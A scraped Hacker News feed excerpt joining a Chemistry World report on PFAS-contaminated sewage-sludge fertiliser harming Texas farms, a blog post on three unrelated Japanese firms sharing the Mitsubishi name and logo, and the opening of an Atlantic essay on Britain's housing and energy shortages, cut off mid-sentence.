<p>Since 2016, more than 866,000 tonnes of sewage sludge has been applied to US farmland, <a href="https://www.ewg.org/news-insights/news/2022/04/ewg-forever-chemicals-may-taint-nearly-20-million-cropland-acres" target="_blank">according to an analysis by the Environmental Working Group</a>. The organisation estimates that 5% of all arable land in the US has had fertiliser applied to it that contains PFAS-contaminated biosolids. A recent&nbsp;<a href="https://www.epa.gov/biosolids/draft-sewage-sludge-risk-assessment-perfluorooctanoic-acid-pfoa-and-perfluorooctane" target="_blank">draft report</a> from the EPA appears to show that high levels of PFAS in sewage sludge applied to farmland can <a href="https://www.epa.gov/system/files/documents/2025-01/draft-ra-public-webinar-slides.pdf" target="_blank">cause cancer and other diseases</a> in those living near farms where it is applied.</p>
<h3>PFOS in stillborn calf</h3>
<p>Overall, 32 individual PFAS chemicals were identified on the victims’ properties, including perfluorooctanesulfonic acid (PFOS), perfluorooctanoic acid (PFOA) and hexafluoropropylene oxide-dimer acid (HFPO-DA), also known as GenX.</p>
<blockquote>
<p>The PFAS accumulates in larger and larger amounts from soil to vegetation to animals</p>
<p>Kyla Bennett, Public Employees for Environmental Responsibility</p>
</blockquote>
<p>PFAS levels in drinking water wells on the plaintiffs’ properties were found to range from&nbsp;91 nanograms per litre (ng/l) up to 268ng/l and their soils ranged from 97ng/l to about 6291ng/l (1ng/l is equivalent to 1 part per trillion).</p>
<p>Some of the fish and animal tissue results were much higher. A stillborn calf had PFAS levels approaching 1500ng/l and its liver held more than 613,000ng/l of PFAS, the vast majority of which was PFOS. The tissue of another calf that died at a week old held 3200ng/l of PFAS, including 320ng/l of PFOS, though its liver was not tested.</p>
<div data-attachment="538966" data-sequence="3">
<p><img alt="Dead calf" src="https://d2cbg94ubxgsnp.cloudfront.net/Pictures/480xany/9/6/6/538966_dead_calf_181555.jpg" sizes="(max-width: 1023px) 100vw, 780px" srcset="https://d2cbg94ubxgsnp.cloudfront.net/Pictures/480xany/9/6/6/538966_dead_calf_181555.jpg 480w,https://d2cbg94ubxgsnp.cloudfront.net/Pictures/600xany/9/6/6/538966_dead_calf_181555.jpg 600w,https://d2cbg94ubxgsnp.cloudfront.net/Pictures/780xany/9/6/6/538966_dead_calf_181555.jpg 780w" loading="lazy" width="6000" height="4000"></p>


</div>
<p>Meanwhile, two fish tested at more than 74,000ng/l and 57,000ng/l of PFOS, respectively. And the actual fertiliser product itself tested at 13,000ng/l of PFOS in about 100g of the product. The source of the PFAS contaminating these biosolids isn’t entirely clear, but it is likely to be from runoff entering drains. This wastewater could be contaminated by PFAS-containing firefighting foams, industrial effluent, landfill leachate and other unknown sources.</p>
<p>Earlier this year, <a href="https://www.chemistryworld.com/news/us-finally-gets-nationwide-regulation-of-pfas-in-drinking-water/4019300.article">the EPA released long-awaited regulations that set national and enforceable drinking water standards for six PFAS</a>, known as maximum contaminant levels (MCLs), which specified 4ng/l for both PFOA and for PFOS individually, as well as 10ng/l for GenX. <a href="https://www.epa.gov/system/files/documents/2023-03/Pre-Publication%20Federal%20Register%20Notice_PFAS%20NPDWR_NPRM_Final_3.13.23.pdf">The agency also proposed health-based, non-enforceable MCL goals of zero for PFOA and PFOS</a><strong> </strong>because ‘there is no dose below which either chemical is considered safe’.</p>
<p>Those thresholds are dramatically lower than the non-regulatory 70ng/l lifetime health advisory for drinking water that the EPA established in 2016 for PFOA and PFOS.<strong></strong></p>
<h3>Biomagnifying up the food chain</h3>
<p><a href="https://peer.org/author/kyla-bennett/">Kyla Bennett</a>, an ecologist who directs science policy for the nonprofit group Public Employees for Environmental Responsibility (Peer) and served as a consultant for the investigation, had previously been involved in a couple of cases involving biosolids and quickly connected the dots. ‘When we heard “biosolids”, we were like, “Well, we know what’s killing all of their animals”,’ recalls Bennett, a former wetland permit reviewer and wetlands enforcement coordinator at the EPA.</p>
<blockquote>
<p>If we’re regulating drinking water to 4[ng/l] then biosolids should be regulated</p>
<p>Larry Woolley, County Commissioner</p>
</blockquote>
<p>The PFAS contained in the biosolids can seep into the soil, groundwater and surface waters of land treated with this fertiliser. This can contaminate plants grown there, which are then eaten by livestock with the contamination moving up the food chain to people.</p>
<p>‘What we think is happening is that all this PFAS leached onto the neighbouring farm – to our clients,’ Bennett tells <em>Chemistry World</em>. ‘It got into the water – into the stock ponds – and the cows are drinking and swimming in those stock ponds and eating the grass, which is now contaminated with PFAS, and it biomagnifies through the food chain.’</p>
<p>‘The PFAS accumulates in larger and larger amounts from soil to vegetation to animals,’ she explains, noting that her affected clients have stopped selling their meat since they discovered the contamination.</p>
<p>Besides the criminal investigation that Ames is leading, there are two other related legal cases running in parallel.</p>
<h3>Parallel lawsuits</h3>
<p>The first involves <a href="https://peer.org/epa-sued-to-remove-pfas-from-biosolid-fertilizers/">Peer suing the EPA to force the agency to start regulating PFAS in biosolids</a> under the Clean Water Act (CWA), which would involve prohibiting products from being applied to land if they contain PFAS in amounts above a certain threshold. The agency <a href="https://d12v9rtnomnebu.cloudfront.net/diveimages/2024.09.09_EPA-mem-in-support-of-mot-to-dismiss.pdf">moved to dismiss that lawsuit back in September</a>, arguing that the CWA only requires that it review biosolids regulations every two years but not actually identify ‘additional toxic pollutants’ to be regulated.</p>
<p>The other ongoing case is <a href="https://peer.org/wp-content/uploads/2024/02/2024.02.27-First-Amended-Complaint-Date-Stamped.pdf">a liability lawsuit, launched by affected farmers, against Synagro and its Texas affiliate</a> and brought by a private law firm. It seeks financial compensation for the plaintiffs – compensatory and punitive damages of more than $75,000.</p>
<p>‘Similar instances of PFAS poisonings of farms, dairies and ranches have occurred in several states,’ <a href="https://peer.org/pfas-biosolids-fertilizer-damages-lawsuit/">Bennett stated when announcing that lawsuit in February</a>. She pointed out that Maine <a href="https://www.mainechamber.org/mscc-blog/pfas-legislation-signed-into-law-by-governor-janet-mills">outlawed application of biosolids</a> back in April 2022 after more than 60 farms were found to have unsafe levels of PFAS contamination. ‘This lawsuit against Synagro will likely be the first of many,’ Bennett predicted.</p>
<p><a href="https://www.michigan.gov/pfasresponse/investigations/wastewater">Michigan</a> and <a href="https://cdphe.colorado.gov/water-Biosolids-PFAS">Colorado</a> have also put in place regulations requiring their wastewater treatment plants to assess and report the levels of PFAS contamination and control the entry of these chemicals into the wastewater system from major industrial sources.</p>
<p>States are stepping up in the absence of federal action. The EPA has no authority to regulate contaminants like PFAS in biosolids and it currently only requires that they be tested for nine heavy metals and a handful of pathogens.</p>
<h3>EPA taking ‘far too long’</h3>
<p>There is a consensus among many stakeholders about the importance of federal regulation of<strong> </strong>PFAS in biosolids. ‘If we’re regulating drinking water to 4[ng/l] then biosolids should be regulated at probably not 4[ng/l], but at some figure not much higher than that,’ Woolley states.</p>
<p>Ames agrees. ‘When the EPA says that these chemicals are so dangerous that we can’t afford to have more than 4[ng/l] in drinking water … can you tell me how in the hell it would be okay to sit down and eat a calf’s liver … that has 610,000[ng/l] of PFOS in it?’ she asks.</p>
<p>Before they started being applied as fertiliser, biosolids were disposed of in lakes, streams and oceans, contaminating waterways and marine life. Then the CWA, which became law in 1972, allowed application of this organic matter to farmland.</p>
<p>The EPA has been investigating whether PFAS should be regulated in biosolids for several years now and the agency is taking ‘far too long’ to act, according to Bennett. ‘We’re losing farms all across the country,’ she says. ‘If you look at Maine, they have something like 70-plus impacted farms, and Michigan, Minnesota, New Mexico – everywhere you look – we’re finding problems.’</p>
<p><a href="https://www.chemistryworld.com/news/the-scale-of-the-problem-of-replacing-forever-chemicals-pfas/4020175.article">PFAS is ubiquitous in consumer products</a> and these chemicals are not removed during wastewater treatment. In fact, up to 19 times more PFAS are created during this process because some of these chemicals get partially broken down and then recombine and form new PFAS compounds, according to Bennett.</p>
<p>Currently, there are three EPA-approved methods for disposing of biosolids – incineration, landfill and applying them to land. The cheapest option is to sell such products as fertiliser to farmers for anywhere from $30–$40/tonne, Woolley notes.<strong></strong></p>
<p>Meanwhile, the EPA still has no standard definition of PFAS. Bennett argues that the agency should define these chemicals broadly, regulate them as one class, and ban all non-essential uses. ‘If they do those three very simple things, then there won’t be PFAS in our consumer products and it won’t be in the biosolids, and then they can land apply it,’ she states.</p>
<h3 id="Legislating_for_PFAS">Legislating for PFAS</h3>
<p>In terms of what’s next for Johnson County, the legislative session starts in late January, and one of Woolley’s goals is to educate county leaders, as well as state representatives and state senators, about the risk of PFAS-contaminated biosolids in fertiliser. He and fellow commissioners are currently working on developing draft legislation to address the issue.</p>
<blockquote>
<p>This is a national crisis that is threatening our entire food supply</p>
<p>Kyla Bennett, Public Employees for Environmental Responsibility</p>
</blockquote>
<p>At the state level, Texas state congresswoman-elect Helen Kerwin <a href="https://trackbill.com/bill/texas-house-bill-1674-relating-to-the-production-sale-and-use-of-certain-agricultural-products-containing-perfluoroalkyl-and-polyfluoroalkyl-substances-pfas-creating-a-criminal-offense/2580194/">introduced legislation on 19 December</a> to strictly limit the amount of PFAS chemicals in fertilisers and other agricultural materials. This bill would also require manufacturers to regularly test for, and publicly report, PFAS levels.</p>
<p>There is concern about progress at the national level in the US. Bennett, for example, is not optimistic about the new administration, noting that Project 2025 – a conservative blueprint for a second Trump presidency that was crafted with input from several of the president-elect’s former cabinet members – <a href="https://static.project2025.org/2025_MandateForLeadership_FULL.pdf">clearly expresses an intent to revisit PFAS regulations</a> and the designation of these chemicals as ‘hazardous substances’.</p>
<p>The Republican senator who will chair the Senate Environment and Public Works Committee in the new Congress, Shelley Moore Capito, <a href="https://www.capito.senate.gov/news/press-releases/video-capito-raises-questions-onepa-regulatory-impacts-on-water-systems-process-on-maximum-contaminant-level">recently repeated claims that the EPA’s new, stricter PFAS drinking water standards are based on questionable science and she suggested that these regulations are too costly for water utilities to implement</a>.</p>
<p><a href="https://www.awwa.org/AWWA-Articles/statement-from-awwa-and-amwa-on-petition-for-judicial-review-of-pfas-regulation">Water utilities</a> and <a href="https://documents.nam.org/COMM/NAM_et_al_v._EPA_PFAS_MCL_Challenge.pdf">chemical companies</a> are already challenging these rules in court, with the former arguing that they significantly underestimate nationwide compliance costs, and the latter maintaining that the regulations exceed the agency’s authority.</p>
<p>‘The EPA is being sued over the MCLs, and under a Trump EPA I can see them saying, “Yep, you’re right, never mind, we’ll revisit this”,’ Bennett states. She notes that these drinking water standards aren’t even in effect because the EPA gave public water systems five years – until 2029 – to comply.</p>
<p>PFAS-contaminated biosolids in fertilisers is<strong> </strong>not just a Johnson County or Texas problem, Bennett emphasises. ‘This is a national crisis that is threatening our entire food supply,’ she warns. ‘We cannot afford to have a state-by-state solution to this problem – we need a federal solution.’</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[One Logo, Three Companies (106 pts)]]></title>
            <link>https://estilofilos.blogspot.com/2016/03/one-logo-three-companies-i.html</link>
            <guid>43245315</guid>
            <pubDate>Mon, 03 Mar 2025 18:54:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://estilofilos.blogspot.com/2016/03/one-logo-three-companies-i.html">https://estilofilos.blogspot.com/2016/03/one-logo-three-companies-i.html</a>, See on <a href="https://news.ycombinator.com/item?id=43245315">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
I am not going to speak about fountain pens today but about pencils and paper… and whisky and cars…</p><p>

The brand Mitsubishi is well known for a number of products and services available in the market. So, we can buy a Mitsubishi Pajero, open an account in the Bank of Tokyo-Mitsubishi-UFJ, drink a Mitsubishi cider, write with a Mitsubishi UNI pencil on a paper with a THREE DIAMOND watermark… and even more without realizing we still were in the Mitsubishi realm: a picture with a Nikon camera, a Kirin whisky,…</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyRbGAm3e40ZeM-maBxu2Iayyw1b5vErqboDJzCF_pYSiafxV7TsMdXYCaulvTYzcCQ1o1FlJNuhYxtpj3SkDV23ySf8JJW8wZtp450rvUE5UD7s2WaDTSXohPHlQWM0FRyDpiS7W2THi9/s1600/P1050147-blog-WM.jpg" imageanchor="1"><img height="215" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyRbGAm3e40ZeM-maBxu2Iayyw1b5vErqboDJzCF_pYSiafxV7TsMdXYCaulvTYzcCQ1o1FlJNuhYxtpj3SkDV23ySf8JJW8wZtp450rvUE5UD7s2WaDTSXohPHlQWM0FRyDpiS7W2THi9/s320/P1050147-blog-WM.jpg" width="300"></a><br><i>Is this a car, a pencil, a bank, a cider...?</i>
</p>

<p>
Mitsubishi is all that and more. But Mitsubishi is, first, three very different things.</p><p>

Mitsubishi is the <a href="https://en.wikipedia.org/wiki/Mitsubishi">Mitsubishi Group of Companies</a>, a <i><a href="https://en.wikipedia.org/wiki/Keiretsu">keiretsu</a></i> of <a href="https://www.mitsubishi.com/php/users/category_search.php?lang=1">companies operating in a very wide variety of fields</a>. It all started in 1870 by the hand of Yatarô Iwasaki as a freight transporter. Around 1913, the company registered the well known logo with the three diamonds. Among the fields included in the activities of the Group we can find finances, nuclear technology, cars and industrial vehicles, paper milling… Some of the companies in the Group use the three diamond logo, but not all of them.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFXyC1AQqWVs01vCJNA2nQ-HxX4DM_kH7kj7cl6BFGGQpYkTv5S2Bu5MpE0TsnANPnqjPIQBHswMeU9v0ZuXwwhx7kPXvzvRteK-ozfCG6IM2wR3Gxk9iDRgRBt2YG60vsKTORpP1WfAi5/s1600/KIMG0169-blog-WM.jpg" imageanchor="1"><img height="686" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFXyC1AQqWVs01vCJNA2nQ-HxX4DM_kH7kj7cl6BFGGQpYkTv5S2Bu5MpE0TsnANPnqjPIQBHswMeU9v0ZuXwwhx7kPXvzvRteK-ozfCG6IM2wR3Gxk9iDRgRBt2YG60vsKTORpP1WfAi5/s320/KIMG0169-blog-WM.jpg" width="300"></a>
</p>



<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjez4d8d4MRb627T1AImGVJkgFMdtKtIuzSFt5S5g5ASi_kKAzoaqdnJRsbCE8I5-PgFNFMgyRxlvnfdocf0O-b8eYOK45vt-DoMPWo-CPQFEt-gmCYO5Raq7wN512leQWOmzYfJ6lilZam/s1600/IMG_7246-blog-WM.jpg" imageanchor="1"><img height="375" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjez4d8d4MRb627T1AImGVJkgFMdtKtIuzSFt5S5g5ASi_kKAzoaqdnJRsbCE8I5-PgFNFMgyRxlvnfdocf0O-b8eYOK45vt-DoMPWo-CPQFEt-gmCYO5Raq7wN512leQWOmzYfJ6lilZam/s320/IMG_7246-blog-WM.jpg" width="500"></a><br><i>Kirin and Nikon are also part of the Mitsubishi Group of Companies.</i>
</p>

<p>
A second company by the same name is <a href="http://www.mpuni.co.jp/">Mitsubishi Pencil Co.</a> This has no ties with the big Mitsubishi Group. The pencil company was founded in 1887 by Jinroku Masaki as Masaki Pencil Co. (Masaki Enpitsu), and in 1903 he registered the three diamond logo based on the family crest. The activities of this company, soon to celebrate its 130 years of history, are limited to the production of writing tools, but not of paper.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhzTY59tIqzVMJCrrzNz5i4bKsre13Hnv_Nf3gGGf2GBcuJ9DBz1fTj3ohjkSP8luCfYDAL6LzAkok85AiNiq6yXBbYWf7FccHuiLywp_Oyfz-Q3S6kCMpVGy5BU6DCOX7FUWAqIEUvVLK/s1600/Pencil+box-blog-WM.jpg" imageanchor="1"><img height="233" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhzTY59tIqzVMJCrrzNz5i4bKsre13Hnv_Nf3gGGf2GBcuJ9DBz1fTj3ohjkSP8luCfYDAL6LzAkok85AiNiq6yXBbYWf7FccHuiLywp_Oyfz-Q3S6kCMpVGy5BU6DCOX7FUWAqIEUvVLK/s320/Pencil+box-blog-WM.jpg" width="400"></a>
</p>



<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7pweI9zScttYpdbsnqm2hyphenhyphen7I92IPWuu5sXuum0m7CSiV6UKOklHm6qDTo2E8ziugew7zF_pQSsRxnuZRbilbeL4iguScSAVD4pNQBY34U1FoQTge7lSjKJkC4eW5oF4qsSCZA11C_DKPN/s1600/IMG_7230-blog-WM.jpg" imageanchor="1"><img height="133" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7pweI9zScttYpdbsnqm2hyphenhyphen7I92IPWuu5sXuum0m7CSiV6UKOklHm6qDTo2E8ziugew7zF_pQSsRxnuZRbilbeL4iguScSAVD4pNQBY34U1FoQTge7lSjKJkC4eW5oF4qsSCZA11C_DKPN/s320/IMG_7230-blog-WM.jpg" width="400"></a><br><i>HI-uni is one of the lines of graphie pencils of Mitsubishi Pencil Co.</i>
</p>

<p>
Finally, Mitsubishi is also the name of a cider –in the Japanese meaning of it, a non-alcoholic, carbonated soda—produced by the company <a href="http://www.konyusha.co.jp/index.html">Konyusha</a>, from Kumamoto, unrelated to the Mitsubishi <i>keiretsu</i>. It was founded in 1883 and registered the three diamond logo in 1919.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinBX0vIRENRRailtvcTXhxng1Qi4Jp7815ig10Xc3ois05czMLsoyqKhokOOLoCn5fHqq4btvuOJ04ZU483SuGhuxxU1I0oNijmu14RYLeS30QPxf45sRV7PQUwZ91gKJp70qFlAUjfE2n/s1600/IMG_7257-blog-WM.jpg" imageanchor="1"><img height="350" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinBX0vIRENRRailtvcTXhxng1Qi4Jp7815ig10Xc3ois05czMLsoyqKhokOOLoCn5fHqq4btvuOJ04ZU483SuGhuxxU1I0oNijmu14RYLeS30QPxf45sRV7PQUwZ91gKJp70qFlAUjfE2n/s320/IMG_7257-blog-WM.jpg" width="350"></a><br><i>Yeah, Mitsubishi cider... together with the three diamond logo as well.</i>
</p>

<p>
So, there we have three different companies using the same name and the same logo. No wonder, then, the existence of the <a href="https://www.mitsubishi.com/e/group/mark.html">Mitsubishi Corporate Name and Trademark Committee</a> to control and prevent any fraud in the use of both name and logo. But the problem and the confusion are deeply rooted.</p><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHDG11Rhop9X1mxQwPl8lE_Iam0e0QdirMvKJyGK86wy3nsc8REac7G5ZJhVL1aZaqflrDlqgbld6hw9Jq6WP673xw388bYgnGMHrrq_g9Gq8vbI-lSl8C66SIdjC_RlnpHgu4yHkXQhf6/s1600/IMG_3631-blog-WM.jpg" imageanchor="1"><img height="143" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHDG11Rhop9X1mxQwPl8lE_Iam0e0QdirMvKJyGK86wy3nsc8REac7G5ZJhVL1aZaqflrDlqgbld6hw9Jq6WP673xw388bYgnGMHrrq_g9Gq8vbI-lSl8C66SIdjC_RlnpHgu4yHkXQhf6/s320/IMG_3631-blog-WM.jpg" width="200"></a>
</p>

<div><p>
Romillo Essential Black – Montblanc Racing Green</p><p>

Bruno Taut<br>
Nakano March, 2016<br>
etiquetas: Mitsubishi Pencil, Mitsubishi Paper Mills, papelería</p></div>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How the U.K. broke its own economy (277 pts)]]></title>
            <link>https://www.theatlantic.com/ideas/archive/2025/03/uk-needs-abundance/681877/</link>
            <guid>43245235</guid>
            <pubDate>Mon, 03 Mar 2025 18:45:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theatlantic.com/ideas/archive/2025/03/uk-needs-abundance/681877/">https://www.theatlantic.com/ideas/archive/2025/03/uk-needs-abundance/681877/</a>, See on <a href="https://news.ycombinator.com/item?id=43245235">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><header data-event-module="hero"><div><div><p>With the best intentions, the United Kingdom engineered a housing and energy shortage.</p></div><div><figure><div data-flatplan-lead_figure_media="true"><picture><img alt="British flag umbrella turned inside out on a wet sidewalk" sizes="(min-width: 976px) 976px, 100vw" srcset="https://cdn.theatlantic.com/thumbor/iwcB2vvLLjzDdruzZKhBAd5WQwY=/0x0:2700x1519/750x422/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 750w, https://cdn.theatlantic.com/thumbor/waTG8YmDMXlIhPy6smV0d90cpEQ=/0x0:2700x1519/828x466/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 828w, https://cdn.theatlantic.com/thumbor/7zzKOU2bCpn2_rVsNaWESSOUfx0=/0x0:2700x1519/960x540/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 960w, https://cdn.theatlantic.com/thumbor/q6BCaYL_5P1drYUCIhHDuwq8Mpg=/0x0:2700x1519/976x549/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 976w, https://cdn.theatlantic.com/thumbor/NjMSW58E8Bk9Dv1E8TZ0fhHSr-s=/0x0:2700x1519/1952x1098/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 1952w" src="https://cdn.theatlantic.com/thumbor/7zzKOU2bCpn2_rVsNaWESSOUfx0=/0x0:2700x1519/960x540/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg" id="article-lead-image" width="960" height="540"></picture></div><figcaption data-flatplan-lead_figure_caption="true">ballyscanlon / Getty</figcaption></figure></div></div><gpt-ad format="injector" sizes-at-0="mobile-wide" targeting-pos="injector-article-start" sizes-at-976="desktop-wide"></gpt-ad></header><div data-view-action="view - audio player - start" data-view-label="681877" data-event-module="audio player" data-event-content-type="narrated" data-event-module-state="start" data-event-view="true"><div><p><img alt="British flag umbrella turned inside out on a wet sidewalk" sizes="80px" srcset="https://cdn.theatlantic.com/thumbor/JxMC2TyWH7ZCeH1Yue8aNI1IOjk=/162x0:1681x1519/80x80/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 80w, https://cdn.theatlantic.com/thumbor/8h1GCscqCO1iKkzySq3VTACwtMs=/162x0:1681x1519/96x96/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 96w, https://cdn.theatlantic.com/thumbor/DY39a6tMXnsf09EKpJLQQQ4cWOg=/162x0:1681x1519/128x128/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 128w, https://cdn.theatlantic.com/thumbor/MYb7prbT6vBLBEoKOrXGXIUgHAU=/162x0:1681x1519/160x160/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 160w, https://cdn.theatlantic.com/thumbor/AOhtVvKjU36g_HXFwXWP3kDMk9g=/162x0:1681x1519/192x192/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 192w, https://cdn.theatlantic.com/thumbor/OLHgxUk_flcanBPo0U0Xyof551k=/162x0:1681x1519/256x256/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 256w, https://cdn.theatlantic.com/thumbor/_0TtLa8scgz650kOOx2728KwnTE=/162x0:1681x1519/384x384/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 384w, https://cdn.theatlantic.com/thumbor/rsjZU7XfOJDeGfpq59mpQ2oQe0I=/162x0:1681x1519/512x512/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg 512w" src="https://cdn.theatlantic.com/thumbor/JxMC2TyWH7ZCeH1Yue8aNI1IOjk=/162x0:1681x1519/80x80/media/img/mt/2025/02/2025_02_27_british_economy_AZ_479794709/original.jpg" width="80" height="80"></p></div><p>Produced by ElevenLabs and<!-- --> <a href="https://newsoveraudio.com/?offerId=atl_reader_exclusive_jks1kjl"> <!-- -->News Over Audio (Noa)</a> <!-- -->using AI narration. Listen to more stories on the Noa app.</p></div><section data-event-module="article body" data-flatplan-body="true"><p data-flatplan-paragraph="true">What’s the matter with the United Kingdom? Great Britain is the birthplace of the Industrial Revolution, which ushered in an era of energy super-production and launched an epoch of productivity advancements that made many life essentials, such as clothes and food, more affordable. Today, the country suffers from the converse of these achievements: a profound energy shortage and a deep affordability crisis. In February, the Bank of England reported an ongoing productivity slump so mysterious that its own economists “<a data-event-element="inline link" href="https://x.com/surplustakes/status/1887506827664928819">cannot account fully</a>” for it. Real wages have barely grown for 16 years. British politics seems stuck in a cycle of disappointment followed by dramatic promises of growth, followed by yet more disappointment.</p><p data-flatplan-paragraph="true">A new report, titled <a data-event-element="inline link" href="https://ukfoundations.co/">“Foundations,”</a> captures the country’s economic malaise in detail. The U.K. desperately needs more houses, more energy, and more transportation infrastructure. “No system can be fixed by people who do not know why it is broken,” write the report’s authors, Sam Bowman, Samuel Hughes, and Ben Southwood. They argue that the source of the country’s woes as well as “the most important economic fact about modern Britain [is] that it is difficult to build almost anything, anywhere.” The nation is gripped by laws and customs that make essentials unacceptably scarce and drive up the cost of construction across the board.</p><p data-flatplan-paragraph="true">Housing is an especially alarming case in point. The homeownership rate for the typical British worker aged 25 to 34 declined by more than half <a data-event-element="inline link" href="https://ifs.org.uk/sites/default/files/output_url_files/BN224.pdf">from the 1990s to the 2010s</a>. In that same time, average housing prices more than doubled, even after adjusting for inflation, according to the Institute for Fiscal Studies.</p><p id="injected-recirculation-link-0" data-view-action="view link - injected link - item 1" data-event-element="injected link" data-event-position="1"><a href="https://www.theatlantic.com/newsletters/archive/2022/10/uk-economy-disaster-degrowth-brexit/671847/">Read: How the U.K. became one of the poorest countries in Western Europe</a></p><p data-flatplan-paragraph="true">The housing shortage traces back to the postwar period, when a frenzy of nationalization swept the country. The U.K. created the National Health Service, brought hundreds of coal mines under state control, and centralized many of the country’s railways and trucking and electricity providers. In 1947, the U.K. passed the Town and Country Planning Act, which forms the basis of modern housing policy. The TCPA effectively prohibited new development without special permission from the state; “green belts” were established to restrict sprawl into the countryside. Rates of private-home building never returned to their typical prewar levels. With some spikes and troughs, new homes built as a share of the total housing stock have generally declined over the past 60 years.</p><p data-flatplan-paragraph="true">The TCPA was considered reasonable and even wise at the time. Postwar Britain had been swept up by the theory that nationalization created economies of scale that gave citizens better outcomes than pure capitalism. “There was an idea that if we could rationalize the planning system … then we could build things in the right way—considered, and planned, and environmentally friendly,” Bowman told me.</p><p data-flatplan-paragraph="true">But the costs of nationalization became clear within a few decades. With more choke points for permitting, construction languished from the 1950s through the ’70s. Under Prime Minister Margaret Thatcher, the Conservatives rolled back nationalization in several areas, such as electricity and gas production. But their efforts to loosen housing policy from the grip of government control was a tremendous failure, especially once it was revealed that Thatcher’s head of housing policy himself opposed new housing developments near his home.</p><p data-flatplan-paragraph="true">Housing is, as I’ve written, <a data-event-element="inline link" href="https://www.theatlantic.com/ideas/archive/2024/08/the-urban-family-exodus-is-a-warning-for-progressives/679350/">the quantum field of urban policy</a>, touching every station of urban life. Broken housing policies have a ripple effect. In London, Bowman said, the most common options are subsidized flats for the low-income and luxury units for the rich, creating a dearth of middle-class housing. As a result, the city is bifurcated between the über-wealthy and the subsidized poor. “I think housing policy is a major driver of a lot of anti-foreigner, white-supremacist, anti-Black, anti-Muslim attitudes among young people who are frustrated that so-called these people get free houses while they have to live in a bedsit or move somewhere an hour outside the city and commute in,” Bowman said.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/ideas/archive/2024/08/the-urban-family-exodus-is-a-warning-for-progressives/679350/">Read: The urban family exodus is a warning for progressives</a></p><p data-flatplan-paragraph="true">Constrictive housing policy in Britain has also arguably prevented other great cities from being born. If the University of Cambridge’s breakthroughs in biotech had happened in the 19th century, Bowman said, the city of Cambridge might have bloomed to accommodate new companies and residents, the same way Glasgow grew by an order of magnitude around shipbuilding in the 1800s. Instead Cambridge remains a small city of fewer than 150,000 people, its potential stymied by rules all but prohibiting its growth.</p><p data-flatplan-paragraph="true">The story for transit and energy is similar: Rules and attitudes that make it difficult to build things in the world have made life worse for the British. “On a per-mile basis, Britain now faces some of the highest railway costs in the world,” Bowman, Hughes, and Southwood write. “This has led to some profoundly dissatisfying outcomes. Leeds is now the largest city in Europe without a metro system.” Despite Thatcher’s embrace of North Sea gas, and more <a data-event-element="inline link" href="https://www.theguardian.com/environment/2022/sep/15/liz-truss-to-lift-fracking-ban-despite-little-progress-on-earthquake-risk">recent attempts</a> to loosen fracking regulations, Britain’s energy markets are still an omnishambles. Per capita electricity generation in the U.K. is <a data-event-element="inline link" href="https://ourworldindata.org/grapher/per-capita-electricity-generation?tab=chart&amp;country=GBR~USA">now roughly one-third that of the United States</a>, and energy use per unit of GDP is the lowest in the G7. By these measures, at least, Britain may be the most energy-starved nation in the developed world.</p><p data-flatplan-paragraph="true">Scarcity is a policy choice. This is as true in energy as it is in housing. In the 1960s, Britain was home to about half of the world’s entire fleet of nuclear reactors. Today, the U.K. has extraordinarily high nuclear-construction costs compared with Asia, and it’s behind much of Europe in the <a data-event-element="inline link" href="https://ourworldindata.org/grapher/share-electricity-nuclear?tab=chart&amp;country=FRA~SWE~GBR~USA~ESP~CHE~FIN~CZE~ROU">share of its electricity</a> generated from nuclear power—not only France but also Finland, Switzerland, Sweden, Spain, and Romania.</p><p data-flatplan-paragraph="true">What happened to British nuclear power? After North Sea oil and gas production ramped up in the 1970s and ’80s, Britain redirected its energy production away from nuclear power. Even this shift has had its own complications. In the past few years, the U.K. has passed several measures to reduce shale-gas extraction, citing earthquake risks, environmental costs, and public opposition. As a result, gas production in the U.K. has declined 70 percent since 2000. Although the country’s renewable-energy market has grown, solar and wind power haven’t increased nearly enough to make up the gap.</p><p data-flatplan-paragraph="true">The comparison with France makes clear Britain’s policy error: In 2003, very large businesses in both countries paid about the same price for electricity. But by 2024, after decades of self-imposed scarcity and the supply shock of the war in Ukraine, electricity in the 